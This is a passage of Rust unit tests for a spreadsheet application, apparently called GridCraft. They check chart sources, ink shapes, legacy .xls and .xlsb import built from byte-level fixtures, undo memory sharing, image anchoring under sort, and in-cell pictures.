    s.execute("home.insertRows", json!({"rows": "1:1"})).unwrap();
    assert_eq!(s.doc().unwrap().wb.active().unwrap().charts[0].source.as_deref(), Some("Sheet1!A2:C4"));
    s.execute("chart.switchRowColumn", json!({})).unwrap();
    let c = s.doc().unwrap().wb.active().unwrap().charts[0].clone();
    let values: Vec<&str> = c.series.iter().map(|x| x.values.as_str()).collect();
    assert_eq!(values, ["Sheet1!$B$3:$C$3", "Sheet1!$B$4:$C$4"]);
    let names: Vec<Option<&str>> = c.series.iter().map(|x| x.name.as_deref()).collect();
    assert_eq!(names, [Some("Sheet1!$A$3"), Some("Sheet1!$A$4")]);
    assert_eq!(c.series[0].categories.as_deref(), Some("Sheet1!$B$2:$C$2"));
    // Columns shift the source too.
    s.execute("home.insertColumns", json!({"cols": "A:A"})).unwrap();
    assert_eq!(s.doc().unwrap().wb.active().unwrap().charts[0].source.as_deref(), Some("Sheet1!B2:D4"));
    // Deleting the whole block leaves no stale source behind.
    s.execute("home.deleteRows", json!({"rows": "2:4"})).unwrap();
    assert_eq!(s.doc().unwrap().wb.active().unwrap().charts[0].source, None);
}

/// Sets the first chart's source on Sheet1 as a file might have left it.
fn set_chart_source(s: &mut Session, source: &str) {
    let wb = std::sync::Arc::make_mut(&mut s.active_mut().unwrap().wb);
    wb.sheet_mut(0).unwrap().charts[0].source = Some(source.into());
}

#[test]
fn a_chart_source_already_broken_survives_an_unrelated_edit() {
    let mut s = s();
    s.execute("range.setValues", json!({"range": "A1", "values": [["", "Q1", "Q2"], ["North", 1, 2], ["South", 3, 4]]})).unwrap();
    s.execute("insert.chart", json!({"range": "A1:C3", "type": "column", "at": "F1"})).unwrap();
    s.execute("formulas.defineName", json!({"name": "Rate", "refersTo": "=Sheet1!$A$1"})).unwrap();
    set_chart_source(&mut s, "#REF!");
    // A series reads the name, so the rename rewrites this chart; the source it doesn't use is
    // left broken as it was.
    let wb = std::sync::Arc::make_mut(&mut s.active_mut().unwrap().wb);
    wb.sheet_mut(0).unwrap().charts[0].series[0].values = "=Rate".into();
    s.execute("formulas.defineName", json!({"name": "Fee", "oldName": "Rate", "refersTo": "=Sheet1!$A$1"})).unwrap();
    let chart = s.doc().unwrap().wb.sheet(0).unwrap().charts[0].clone();
    assert_eq!(chart.series[0].values, "=Fee");
    assert_eq!(chart.source.as_deref(), Some("#REF!"));
}

#[test]
fn deleting_a_chart_source_sheet_drops_the_source() {
    let mut s = s();
    s.execute("range.setValues", json!({"range": "A1", "values": [["", "Q1", "Q2"], ["North", 1, 2], ["South", 3, 4]]})).unwrap();
    s.execute("insert.chart", json!({"range": "A1:C3", "type": "column", "at": "F1"})).unwrap();
    s.execute("home.insertSheet", json!({})).unwrap();
    set_chart_source(&mut s, "Sheet2!A1:C3");
    // The edit breaks the source, so it goes.
    s.execute("home.deleteSheet", json!({"sheet": "Sheet2"})).unwrap();
    assert_eq!(s.doc().unwrap().wb.sheet(0).unwrap().charts[0].source, None);
}

#[test]
fn ink_strokes_and_ink_to_shape() {
    let mut s = s();
    // A rough closed box.
    let pts: Vec<[f64; 2]> = vec![[100.0, 100.0], [200.0, 102.0], [201.0, 180.0], [99.0, 181.0], [101.0, 104.0]];
    s.execute("draw.stroke", json!({"points": pts})).unwrap();
    let sh = s.doc().unwrap().wb.active().unwrap().clone();
    assert_eq!(sh.shapes.len(), 1);
    assert_eq!(sh.shapes[0].kind, gridcraft_model::ShapeKind::Ink);
    let r = s.execute("draw.inkToShape", json!({})).unwrap();
    assert_eq!(r["kind"], "Rectangle");
    // An open stroke becomes a line.
    s.execute("draw.stroke", json!({"points": [[0.0, 0.0], [50.0, 10.0], [120.0, 30.0]]})).unwrap();
    assert_eq!(s.execute("draw.inkToShape", json!({})).unwrap()["kind"], "Line");
    assert!(s.execute("draw.stroke", json!({"points": [[1.0, 1.0]]})).is_err());
}

#[test]
fn xlsb_import_keeps_cached_values_and_reports_limits() {
    let bytes = xlsb_fixture();
    assert_eq!(gridcraft_xlsx::sniff(&bytes), gridcraft_xlsx::Format::Xlsb);
    for name in ["source.xlsb", "source.xlsx"] {
        let mut s = s();
        let r = s.execute("file.open", json!({"name": name, "base64": crate::io::base64_encode(&bytes)})).unwrap();
        assert!(!r["warnings"].as_array().unwrap().is_empty());
        assert!(s.take_ui_requests().iter().any(|r| matches!(r, crate::UiRequest::Message(_))));
        assert!(s.doc().unwrap().path.is_none());
        assert!(s.doc().unwrap().display_title().ends_with(".xlsx"));
        assert_eq!(v(&s, "A1"), Value::Number(42.0));
        assert_eq!(v(&s, "B1"), Value::from("Original data"));
        assert_eq!(
            s.doc().unwrap().wb.active().unwrap().cell(CellRef::parse("A1").unwrap()).unwrap().formula.as_ref().map(|f| f.text.as_str()),
            Some("42")
        );
        s.execute("cell.set", json!({"cell": "B1", "input": "Changed"})).unwrap();
        assert_eq!(v(&s, "A1"), Value::Number(42.0));
        let saved = s.execute("file.saveBytes", json!({"format": "xlsx"})).unwrap();
        s.execute("file.open", json!({"name": "imported.xlsx", "base64": saved["base64"]})).unwrap();
        assert_eq!(v(&s, "A1"), Value::Number(42.0));
    }
}

#[test]
#[cfg(not(target_arch = "wasm32"))]
fn xlsb_import_never_reuses_source_as_save_target() {
    let nonce = unique_nonce();
    let dir = std::env::temp_dir().join(format!("gridcraft-xlsb-{}-{nonce}", std::process::id()));
    std::fs::create_dir(&dir).unwrap();
    let bytes = xlsb_fixture();
    for name in ["source.xlsb", "disguised.xlsx"] {
        let path = dir.join(name);
        std::fs::write(&path, &bytes).unwrap();
        let mut s = s();
        s.execute("file.open", json!({"path": path})).unwrap();
        s.take_ui_requests();
        s.execute("cell.set", json!({"cell": "A1", "input": "43"})).unwrap();
        s.execute("file.save", json!({})).unwrap();
        assert!(s.take_ui_requests().iter().any(|r| matches!(r, crate::UiRequest::Dialog(name, _) if name == "saveAs")));
        assert_eq!(std::fs::read(&path).unwrap(), bytes);
        assert!(s.execute("file.saveAs", json!({"path": dir.join("source.xlsb")})).is_err());
        assert!(s.execute("file.saveBytes", json!({"format": "xlsb"})).is_err());
        let output = dir.join("converted.xlsx");
        s.execute("file.saveAs", json!({"path": output})).unwrap();
        assert!(!s.doc().unwrap().is_dirty());
        assert_eq!(std::fs::read(&path).unwrap(), bytes);
        s.execute("file.open", json!({"name": "converted.xlsx", "base64": crate::io::base64_encode(&std::fs::read(output).unwrap())})).unwrap();
        assert_eq!(v(&s, "A1"), Value::Number(43.0));
    }
    std::fs::remove_dir_all(dir).unwrap();
}

/// A one-sheet Excel 97-2003 workbook ([MS-CFB] container, [MS-XLS] BIFF8 stream) built in code:
/// A1 = 42 and A2 = `A1*2` with its cached result.
fn xls_fixture() -> Vec<u8> {
    fn rec(id: u16, payload: &[u8]) -> Vec<u8> {
        [&id.to_le_bytes()[..], &(payload.len() as u16).to_le_bytes(), payload].concat()
    }
    let bof = |dt: u16| rec(0x0809, &[&0x0600u16.to_le_bytes()[..], &dt.to_le_bytes(), &[0; 12]].concat());
    let sheet = [
        bof(0x0010),
        rec(0x0203, &[&[0u8, 0, 0, 0, 0, 0][..], &42f64.to_le_bytes()].concat()),
        rec(0x0006, &[&[1u8, 0, 0, 0, 0, 0][..], &84f64.to_le_bytes(), &[0; 6], &[9, 0, 0x44, 0, 0, 0, 0xC0, 0x1E, 2, 0, 0x05]].concat()),
        rec(0x000A, &[]),
    ]
    .concat();
    let globals = |pos: u32| [bof(0x0005), rec(0x0085, &[&pos.to_le_bytes()[..], &[0, 0, 3, 0], b"Old"].concat()), rec(0x000A, &[])].concat();
    let stream = [globals(globals(0).len() as u32), sheet].concat();
    // Sectors: 0 FAT, 1 directory, 2 mini FAT, 3 mini stream container.
    let mut b = vec![0u8; 512 * 5];
    let mut put = |at: usize, v: &[u8]| b[at..at + v.len()].copy_from_slice(v);
    put(0, &[0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1]);
    put(26, &3u16.to_le_bytes());
    // The byte order mark [MS-CFB] 2.2 requires; craft-cfb refuses a header without it.
    put(28, &0xFFFEu16.to_le_bytes());
    put(30, &9u16.to_le_bytes());
    put(32, &6u16.to_le_bytes());
    put(44, &1u32.to_le_bytes());
    put(48, &1u32.to_le_bytes());
    put(56, &4096u32.to_le_bytes());
    put(60, &2u32.to_le_bytes());
    put(64, &1u32.to_le_bytes());
    put(68, &0xFFFF_FFFEu32.to_le_bytes());
    for i in 1..109 {
        put(76 + i * 4, &0xFFFF_FFFFu32.to_le_bytes());
    }
    for (i, v) in [0xFFFF_FFFDu32, 0xFFFF_FFFE, 0xFFFF_FFFE, 0xFFFF_FFFE].iter().enumerate() {
        put(512 + i * 4, &v.to_le_bytes());
    }
    for i in 4..128 {
        put(512 + i * 4, &0xFFFF_FFFFu32.to_le_bytes());
    }
    let minis = stream.len().div_ceil(64);
    for i in 0..128 {
        let next = if i + 1 < minis {
            i as u32 + 1
        } else if i + 1 == minis {
            0xFFFF_FFFE
        } else {
            0xFFFF_FFFF
        };
        put(512 * 3 + i * 4, &next.to_le_bytes());
    }
    let entry = |k: usize, name: &str, kind: u8, child: u32, start: u32, size: u32, put: &mut dyn FnMut(usize, &[u8])| {
        let at = 512 * 2 + k * 128;
        let units: Vec<u8> = name.encode_utf16().flat_map(u16::to_le_bytes).collect();
        put(at, &units);
        put(at + 64, &(units.len() as u16 + 2).to_le_bytes());
        put(at + 66, &[kind, 1]);
        put(at + 68, &[0xFF; 8]);
        put(at + 76, &child.to_le_bytes());
        put(at + 116, &start.to_le_bytes());
        put(at + 120, &size.to_le_bytes());
    };
    entry(0, "Root Entry", 5, 1, 3, 512, &mut put);
    entry(1, "Workbook", 2, 0xFFFF_FFFF, 0, stream.len() as u32, &mut put);
    put(512 * 4, &stream);
    b
}

#[test]
fn xls_import_keeps_formulas_and_never_saves_back_to_xls() {
    let bytes = xls_fixture();
    assert_eq!(gridcraft_xlsx::sniff(&bytes), gridcraft_xlsx::Format::Xls);
    let mut s = s();
    let r = s.execute("file.open", json!({"name": "legacy.xls", "base64": crate::io::base64_encode(&bytes)})).unwrap();
    assert!(r["warnings"][0].as_str().unwrap().contains("97-2003"));
    assert_eq!(r["sheets"], json!(["Old"]));
    let d = s.doc().unwrap();
    assert!(d.path.is_none());
    assert_eq!(d.display_title(), "legacy (imported).xlsx");
    assert_eq!(v(&s, "A2"), Value::Number(84.0));
    // The formula is live: editing its input recalculates it.
    s.execute("cell.set", json!({"cell": "A1", "input": "50"})).unwrap();
    assert_eq!(v(&s, "A2"), Value::Number(100.0));
    assert!(s.execute("file.saveBytes", json!({"format": "xls"})).is_err());
    assert!(s.execute("file.saveBytes", json!({"format": "xlsx"})).is_ok());
}

#[test]
fn xls_formulas_calculate_with_legacy_implicit_intersection() {
    // Data!A1 = 11, B1:G1 = 1, A2 = 5, A3 = 7. Report!B1:G1 are filled, so a formula in Report!A1
    // that spilled would show #SPILL!. Every cached result is 0, so the values below are GridCraft's.
    fn rec(id: u16, payload: &[u8]) -> Vec<u8> {
        [&id.to_le_bytes()[..], &(payload.len() as u16).to_le_bytes(), payload].concat()
    }
    let u16s = |v: &[u16]| v.iter().flat_map(|x| x.to_le_bytes()).collect::<Vec<u8>>();
    let bof = |dt: u16| rec(0x0809, &[&0x0600u16.to_le_bytes()[..], &dt.to_le_bytes(), &[0; 12]].concat());
    let number = |r: u16, c: u16, n: f64| rec(0x0203, &[&u16s(&[r, c, 0])[..], &n.to_le_bytes()].concat());
    let formula = |r: u16, c: u16, rgce: &[u8]| {
        rec(0x0006, &[&u16s(&[r, c, 0])[..], &0f64.to_le_bytes(), &[0; 6], &(rgce.len() as u16).to_le_bytes(), rgce].concat())
    };
    let area3d = |r0: u16, r1: u16, c0: u16, c1: u16| [&[0x3Bu8, 0, 0][..], &u16s(&[r0, r1, c0, c1])].concat();
    let a2a3 = area3d(1, 2, 0, 0);
    let mut data = bof(0x0010);
    data.extend([number(0, 0, 11.0), number(1, 0, 5.0), number(2, 0, 7.0)].concat());
    (1..7).for_each(|c| data.extend(number(0, c, 1.0)));
    data.extend(rec(0x000A, &[]));
    let mut report = bof(0x0010);
    (1..7).for_each(|c| report.extend(number(0, c, 0.0)));
    // A1 = Data!A1:G1; B2 = Data!$A$2:$A$3*10; C2 = SQRT(Data!$A$2:$A$3) (row 2: SQRT(5));
    // H1 = {SUM(Data!$A$2:$A$3*2)}, a one-cell Ctrl+Shift+Enter array.
    let cse = [&a2a3[..], &[0x1E, 2, 0, 0x05, 0x22, 1, 4, 0]].concat();
    report.extend(formula(0, 0, &area3d(0, 0, 0xC000, 6 | 0xC000)));
    report.extend(formula(1, 1, &[&a2a3[..], &[0x1E, 10, 0, 0x05]].concat()));
    report.extend(formula(1, 2, &[&a2a3[..], &[0x21, 20, 0]].concat()));
    report.extend(formula(0, 7, &[1, 0, 0, 7, 0]));
    report.extend(rec(0x0221, &[&u16s(&[0, 0])[..], &[7, 7], &[0; 6], &(cse.len() as u16).to_le_bytes(), &cse].concat()));
    report.extend(rec(0x000A, &[]));
    let boundsheet = |pos: u32, name: &str| rec(0x0085, &[&pos.to_le_bytes()[..], &[0, 0, name.len() as u8, 0], name.as_bytes()].concat());
    let globals = |p1: u32, p2: u32| {
        [
            bof(0x0005),
            boundsheet(p1, "Data"),
            boundsheet(p2, "Report"),
            rec(0x01AE, &u16s(&[2, 0x0401])),
            rec(0x0017, &u16s(&[1, 0, 0, 0])),
            rec(0x000A, &[]),
        ]
        .concat()
    };
    let p1 = globals(0, 0).len() as u32;
    let stream = [globals(p1, p1 + data.len() as u32), data, report].concat();
    let bytes = gridcraft_xlsx::testing::compound_file(&[("Workbook", &stream)]);

    let mut s = s();
    s.execute("file.open", json!({"name": "legacy.xls", "base64": crate::io::base64_encode(&bytes)})).unwrap();
    s.execute("formulas.calculateNow", json!({})).unwrap();
    let report = |s: &Session, a1: &str| s.doc().unwrap().wb.sheets[1].value(CellRef::parse(a1).unwrap());
    assert_eq!(report(&s, "A1"), Value::Number(11.0));
    assert_eq!(report(&s, "B2"), Value::Number(50.0));
    assert_eq!(report(&s, "C2"), Value::Number(5f64.sqrt()));
    assert_eq!(report(&s, "H1"), Value::Number(24.0));
    // Nothing spilled out of A1 or B2.
    assert_eq!(report(&s, "B1"), Value::Number(0.0));
    assert_eq!(report(&s, "B3"), Value::Empty);
    // Saved as .xlsx, the formulas carry no dynamic-array metadata.
    let r = s.execute("file.saveBytes", json!({"format": "xlsx"})).unwrap();
    let saved = crate::io::base64_decode(r["base64"].as_str().unwrap()).unwrap();
    let (wb, _) = gridcraft_xlsx::read_xlsx(&saved).unwrap();
    let f = |a1: &str| wb.sheets[1].cell(CellRef::parse(a1).unwrap()).and_then(|c| c.formula.clone()).unwrap();
    assert_eq!(f("A1").text, "@Data!A1:G1");
    assert_eq!((f("H1").text.as_str(), f("H1").array), ("SUM(Data!$A$2:$A$3*2)", gridcraft_core::RangeRef::parse("H1")));
    let mut sheet = String::new();
    std::io::Read::read_to_string(
        &mut zip::ZipArchive::new(std::io::Cursor::new(&saved)).unwrap().by_name("xl/worksheets/sheet2.xml").unwrap(),
        &mut sheet,
    )
    .unwrap();
    assert!(!sheet.contains("cm=") && !sheet.contains("SINGLE"), "{sheet}");
}

#[test]
fn malformed_xlsb_keeps_the_current_workbook() {
    let mut s = s();
    s.execute("cell.set", json!({"cell": "A1", "input": "Keep me"})).unwrap();
    assert!(s.execute("file.open", json!({"name": "bad.xlsb", "base64": crate::io::base64_encode(b"not a workbook")})).is_err());
    assert_eq!(s.documents().len(), 1);
    assert_eq!(v(&s, "A1"), Value::from("Keep me"));
    assert!(s.doc().unwrap().is_dirty());
}

/// A 2×2 PNG, so objects can be injected into a workbook in tests.
fn tiny_png() -> Vec<u8> {
    let img = image::RgbaImage::from_raw(2, 2, vec![255, 0, 0, 255, 0, 255, 0, 128, 0, 0, 255, 255, 0, 0, 0, 0]).unwrap();
    let mut png = Vec::new();
    image::DynamicImage::ImageRgba8(img).write_to(&mut std::io::Cursor::new(&mut png), image::ImageFormat::Png).unwrap();
    png
}

fn add_image(s: &mut Session, cell: &str, mode: gridcraft_model::AnchorMode) -> u32 {
    let d = s.doc_mut().unwrap();
    let wb = std::sync::Arc::make_mut(&mut d.wb);
    let id = wb.next_object_id();
    wb.sheet_mut(0).unwrap().images.push(gridcraft_model::Image {
        id,
        anchor: gridcraft_model::Anchor { cell: CellRef::parse(cell).unwrap(), dx: 0.0, dy: 0.0, width: 40.0, height: 40.0, mode },
        data: tiny_png().into(),
        mime: "image/png".into(),
        alt: String::new(),
    });
    id
}

fn image_cell(s: &Session, id: u32) -> Option<CellRef> {
    s.doc().unwrap().wb.active().unwrap().images.iter().find(|i| i.id == id).map(|i| i.anchor.cell)
}

/// Every undo step holds a copy of the workbook. A picture's bytes and the VBA project are shared
/// between those copies instead of copied into each: a 20 MB picture used to cost another 20 MB
/// for every cell typed on its sheet, up to 100 steps (2 GB).
#[test]
fn undo_steps_share_picture_and_macro_bytes() {
    let mut s = s();
    s.execute("insert.picture", json!({"base64": crate::io::base64_encode(&tiny_png()), "at": "C3"})).unwrap();
    std::sync::Arc::make_mut(&mut s.doc_mut().unwrap().wb).vba_project = Some(b"vba".to_vec().into());
    for i in 1..=3 {
        s.execute("cell.set", json!({"cell": format!("A{i}"), "input": i.to_string()})).unwrap();
    }
    let d = s.doc().unwrap();
    let live = &d.wb.active().unwrap().images[0].data;
    let vba = d.wb.vba_project.as_ref().unwrap();
    assert_eq!(**live, tiny_png());
    assert!(d.undo.len() >= 3);
    for step in d.undo.iter().filter(|h| !h.wb.active().unwrap().images.is_empty()) {
        assert!(std::sync::Arc::ptr_eq(&step.wb.active().unwrap().images[0].data, live), "{}", step.label);
    }
    for step in d.undo.iter().rev().take(3) {
        assert!(std::sync::Arc::ptr_eq(step.wb.vba_project.as_ref().unwrap(), vba), "{}", step.label);
    }
    // Undo and redo still give the picture back as it was.
    s.execute("edit.undo", json!({"steps": 3})).unwrap();
    assert_eq!(*s.doc().unwrap().wb.active().unwrap().images[0].data, tiny_png());
    s.execute("edit.redo", json!({})).unwrap();
    assert_eq!(*s.doc().unwrap().wb.active().unwrap().images[0].data, tiny_png());
}

/// Issue #5: images anchored in cells follow their row when the sheet is sorted.
#[test]
fn sort_moves_anchored_images_with_their_rows() {
    use gridcraft_model::AnchorMode;
    let mut s = s();
    s.execute("range.setValues", json!({"range": "A1", "values": [["Name", "Score"], ["b", 2], ["c", 3], ["a", 1]]})).unwrap();
    // One picture per data row, in its own row.
    let ib = add_image(&mut s, "A2", AnchorMode::MoveAndSize);
    let ic = add_image(&mut s, "A3", AnchorMode::MoveAndSize);
    let ia = add_image(&mut s, "A4", AnchorMode::MoveAndSize);
    s.execute("selection.set", json!({"range": "A1:B4"})).unwrap();
    s.execute("data.sortAscending", json!({"header": true, "column": "A"})).unwrap();
    // Ascending by name: b, c, a → a, b, c. Each picture lands in its row's new home.
    assert_eq!(image_cell(&s, ib), Some(CellRef::parse("A3").unwrap()));
    assert_eq!(image_cell(&s, ic), Some(CellRef::parse("A4").unwrap()));
    assert_eq!(image_cell(&s, ia), Some(CellRef::parse("A2").unwrap()));
}

/// An `absolute`-pinned object stays exactly where it was drawn across a sort and a row delete.
#[test]
fn absolute_objects_ignore_sort_and_structural_edits() {
    use gridcraft_model::AnchorMode;
    let mut s = s();
    s.execute("range.setValues", json!({"range": "A1", "values": [["Name", "Score"], ["b", 2], ["c", 3], ["a", 1]]})).unwrap();
    let pinned = add_image(&mut s, "A3", AnchorMode::Absolute);
    s.execute("selection.set", json!({"range": "A1:B4"})).unwrap();
    s.execute("data.sortAscending", json!({"header": true, "column": "A"})).unwrap();
    assert_eq!(image_cell(&s, pinned), Some(CellRef::parse("A3").unwrap()));
    s.execute("home.deleteRows", json!({"rows": "2:2"})).unwrap();
    assert_eq!(image_cell(&s, pinned), Some(CellRef::parse("A3").unwrap()));
}

/// Deleting a row removes the sparkline located on it; later ones shift up.
#[test]
fn deleting_a_row_removes_its_sparklines() {
    let mut s = s();
    s.execute("range.setValues", json!({"range": "A1", "values": [[1, 2, 3], [4, 5, 6], [7, 8, 9]]})).unwrap();
    s.execute("insert.sparkline", json!({"range": "A2:C2", "location": "E2"})).unwrap();
    s.execute("insert.sparkline", json!({"range": "A3:C3", "location": "E3"})).unwrap();
    s.execute("home.deleteRows", json!({"rows": "2:2"})).unwrap();
    let got: Vec<(String, String)> =
        s.doc().unwrap().wb.active().unwrap().sparklines.iter().map(|sp| (sp.cell.to_string(), sp.source.clone())).collect();
    assert_eq!(got, vec![("E2".to_string(), "A2:C2".to_string())]);
}

/// A "move but don't size" object follows its row across a sort but keeps its size.
#[test]
fn move_only_objects_follow_but_do_not_resize() {
    use gridcraft_model::AnchorMode;
    let mut s = s();
    s.execute("range.setValues", json!({"range": "A1", "values": [["Name", "N"], ["b", 2], ["a", 1]]})).unwrap();
    let id = add_image(&mut s, "A2", AnchorMode::MoveOnly);
    s.execute("selection.set", json!({"range": "A1:B3"})).unwrap();
    s.execute("data.sortAscending", json!({"column": "A"})).unwrap();
    // "a" moved to row 2 and "b" to row 3, so the image follows from A2 to A3.
    assert_eq!(image_cell(&s, id), Some(CellRef::parse("A3").unwrap()));
    let a = s.doc().unwrap().wb.active().unwrap().images.iter().find(|i| i.id == id).unwrap().anchor;
    assert_eq!((a.width, a.height), (40.0, 40.0));
}

/// `object.setAnchorMode` changes how an object follows its cells.
#[test]
fn set_anchor_mode_changes_following() {
    use gridcraft_model::AnchorMode;
    let mut s = s();
    s.execute("range.setValues", json!({"range": "A1", "values": [["Name", "N"], ["b", 2], ["a", 1]]})).unwrap();
    let id = add_image(&mut s, "A2", AnchorMode::MoveAndSize);
    let r = s.execute("object.setAnchorMode", json!({"kind": "image", "id": id, "mode": "dontMoveOrSizeWithCells"})).unwrap();
    assert_eq!(r["mode"], "absolute");
    s.execute("selection.set", json!({"range": "A1:B3"})).unwrap();
    s.execute("data.sortAscending", json!({"column": "A"})).unwrap();
    // Pinned absolute: it stays put even though its row moved.
    assert_eq!(image_cell(&s, id), Some(CellRef::parse("A2").unwrap()));
    // A bad mode is rejected, not silently ignored.
    assert!(s.execute("object.setAnchorMode", json!({"kind": "image", "id": id, "mode": "sideways"})).is_err());
}

/// A sort moves only objects anchored inside the sorted block on both axes: a picture beside
/// the block (same rows, other columns) stays where it is.
#[test]
fn sort_leaves_objects_outside_the_block_alone() {
    use gridcraft_model::AnchorMode;
    let mut s = s();
    s.execute("range.setValues", json!({"range": "A1", "values": [["Name", "Score"], ["b", 2], ["c", 3], ["a", 1]]})).unwrap();
    let beside = add_image(&mut s, "Z3", AnchorMode::MoveAndSize);
    let inside = add_image(&mut s, "B3", AnchorMode::MoveAndSize);
    s.execute("selection.set", json!({"range": "A1:B4"})).unwrap();
    s.execute("data.sortAscending", json!({"header": true, "column": "A"})).unwrap();
    assert_eq!(image_cell(&s, beside), Some(CellRef::parse("Z3").unwrap()));
    // "c" moved from row 3 to row 4, taking the picture in B3 with it.
    assert_eq!(image_cell(&s, inside), Some(CellRef::parse("B4").unwrap()));
}

/// Inserted pictures default to Excel's "Move but don't size with cells".
#[test]
fn inserted_pictures_move_but_do_not_size() {
    let mut s = s();
    let b64 = crate::io::base64_encode(&tiny_png());
    let id = s.execute("insert.picture", json!({"base64": b64, "at": "C3"})).unwrap()["image"].as_u64().unwrap() as u32;
    let mode = |s: &Session| s.doc().unwrap().wb.active().unwrap().images.iter().find(|i| i.id == id).unwrap().anchor.mode;
    assert_eq!(mode(&s), gridcraft_model::AnchorMode::MoveOnly);
    let b64 = crate::io::base64_encode(&tiny_png());
    let id2 = s.execute("insert.picture", json!({"base64": b64, "mode": "absolute"})).unwrap()["image"].as_u64().unwrap() as u32;
    let m2 = s.doc().unwrap().wb.active().unwrap().images.iter().find(|i| i.id == id2).unwrap().anchor.mode;
    assert_eq!(m2, gridcraft_model::AnchorMode::Absolute);
}

/// `object.setAnchorMode` needs a real object kind.
#[test]
fn set_anchor_mode_rejects_unknown_kind() {
    use gridcraft_model::AnchorMode;
    let mut s = s();
    let id = add_image(&mut s, "A2", AnchorMode::MoveAndSize);
    for kind in [json!(""), json!("widget"), serde_json::Value::Null] {
        assert!(s.execute("object.setAnchorMode", json!({"kind": kind, "id": id, "mode": "absolute"})).is_err());
    }
    let mode = |s: &Session| s.doc().unwrap().wb.active().unwrap().images[0].anchor.mode;
    assert_eq!(mode(&s), AnchorMode::MoveAndSize);
    s.execute("object.setAnchorMode", json!({"kind": "image", "id": id, "mode": "moveOnly"})).unwrap();
    assert_eq!(mode(&s), AnchorMode::MoveOnly);
}

fn original_cell_picture() -> Vec<u8> {
    let image = image::RgbaImage::from_fn(4, 2, |x, _| if x < 2 { image::Rgba([240, 60, 40, 255]) } else { image::Rgba([20, 100, 240, 128]) });
    let mut png = Vec::new();
    image::DynamicImage::ImageRgba8(image).write_to(&mut std::io::Cursor::new(&mut png), image::ImageFormat::Png).unwrap();
    png
}

fn insert_cell_picture(s: &mut Session, at: &str, alt: &str) {
    s.execute("insert.picture", json!({"placement": "cell", "at": at, "base64": crate::io::base64_encode(&original_cell_picture()), "alt": alt}))
        .unwrap();
}

fn cell_picture(s: &Session, at: &str) -> Option<std::sync::Arc<gridcraft_model::CellPicture>> {
    s.doc().unwrap().wb.active().unwrap().cell_pictures.get(&CellRef::parse(at).unwrap()).cloned()
}

#[test]
fn cell_picture_insert_validates_content_preserves_style_and_replaces_with_undo() {
    let mut s = s();
    s.execute("cell.set", json!({"cell": "B2", "input": "old"})).unwrap();
    s.execute("home.bold", json!({"range": "B2"})).unwrap();
    for bytes in [b"not an image".as_slice(), b"GIF89a", &original_cell_picture()[..24]] {
        assert!(s.execute("insert.picture", json!({"placement": "cell", "at": "B2", "base64": crate::io::base64_encode(bytes)})).is_err());
        assert_eq!(v(&s, "B2"), Value::from("old"));
    }
    insert_cell_picture(&mut s, "B2", "Original picture");
    assert_eq!(v(&s, "B2"), Value::Error(gridcraft_core::CellError::Value));
    let state = s.execute("cell.get", json!({"cell": "B2"})).unwrap();
    assert_eq!(state["type"], "picture");
    assert_eq!(state["text"], "#VALUE!");
    assert_eq!(state["input"], "");
    assert_eq!(state["picture"]["alt"], "Original picture");
    assert!(state["picture"].get("data").is_none());
    assert_eq!(state["style"]["font"]["bold"], true);
    assert!(s.doc().unwrap().wb.active().unwrap().images.is_empty());
    s.execute("cell.set", json!({"cell": "B2", "input": "=2+3"})).unwrap();
    assert!(cell_picture(&s, "B2").is_none());
    assert_eq!(v(&s, "B2"), Value::Number(5.0));
    s.execute("edit.undo", json!({})).unwrap();
    assert_eq!(cell_picture(&s, "B2").unwrap().alt, "Original picture");
    s.execute("range.setValues", json!({"range": "B2", "values": [[7]]})).unwrap();
    assert!(cell_picture(&s, "B2").is_none());
    let mut jpeg = Vec::new();
    image::DynamicImage::ImageRgb8(image::RgbImage::from_pixel(2, 1, image::Rgb([60, 80, 100])))
        .write_to(&mut std::io::Cursor::new(&mut jpeg), image::ImageFormat::Jpeg)
        .unwrap();
    s.execute("insert.picture", json!({"placement": "cell", "at": "D2", "base64": crate::io::base64_encode(&jpeg), "mime": "wrong/client-mime"}))
        .unwrap();
    assert_eq!(cell_picture(&s, "D2").unwrap().mime, "image/jpeg");
}

#[test]
fn cell_picture_clipboard_clear_and_structural_edits_keep_complete_payload() {
    let mut s = s();
    insert_cell_picture(&mut s, "B2", "moves with the row");
    let original = cell_picture(&s, "B2").unwrap();
    s.execute("edit.copy", json!({"range": "B2"})).unwrap();
    s.execute("edit.pasteSpecial", json!({"what": "values", "at": "D2"})).unwrap();
    assert!(std::sync::Arc::ptr_eq(&original, &cell_picture(&s, "D2").unwrap()));
    s.execute("home.bold", json!({"range": "C1"})).unwrap();
    s.execute("edit.copy", json!({"range": "C1"})).unwrap();
    s.execute("edit.pasteSpecial", json!({"what": "formats", "at": "D2"})).unwrap();
    assert_eq!(cell_picture(&s, "D2").unwrap().alt, original.alt);
    s.execute("edit.clearFormats", json!({"range": "D2"})).unwrap();
    assert!(cell_picture(&s, "D2").is_some());
    s.execute("edit.clearContents", json!({"range": "D2"})).unwrap();
    assert!(cell_picture(&s, "D2").is_none());
    s.execute("cell.set", json!({"cell": "C1", "input": "3"})).unwrap();
    s.execute("edit.copy", json!({"range": "B2"})).unwrap();
    s.execute("edit.pasteSpecial", json!({"what": "values", "at": "C1", "operation": "add"})).unwrap();
    assert!(cell_picture(&s, "C1").is_none());
    assert_eq!(v(&s, "C1"), Value::Error(gridcraft_core::CellError::Value));
    s.execute("home.insertRows", json!({"rows": "2:2"})).unwrap();
    s.execute("home.insertColumns", json!({"cols": "B:B"})).unwrap();
    assert_eq!(cell_picture(&s, "C3").unwrap().alt, original.alt);
    s.execute("edit.cut", json!({"range": "C3"})).unwrap();
    s.execute("home.insertSheet", json!({"name": "Destination"})).unwrap();
    s.execute("edit.paste", json!({"at": "E4"})).unwrap();
    assert_eq!(cell_picture(&s, "E4").unwrap().alt, original.alt);
    assert!(s.doc().unwrap().wb.sheet(0).unwrap().cell(CellRef::parse("C3").unwrap()).is_none());
    s.execute("home.deleteColumns", json!({"cols": "E:E"})).unwrap();
    assert!(cell_picture(&s, "E4").is_none());
    s.execute("edit.undo", json!({})).unwrap();
    assert_eq!(cell_picture(&s, "E4").unwrap().data, original.data);
}

#[test]
fn cell_picture_follows_sort_filter_and_blocks_formula_spills() {
    let mut s = s();
    s.execute("range.setValues", json!({"range": "A1", "values": [["Rank", "Picture"], [2], [1]]})).unwrap();
    insert_cell_picture(&mut s, "B2", "rank two");
    insert_cell_picture(&mut s, "B3", "rank one");
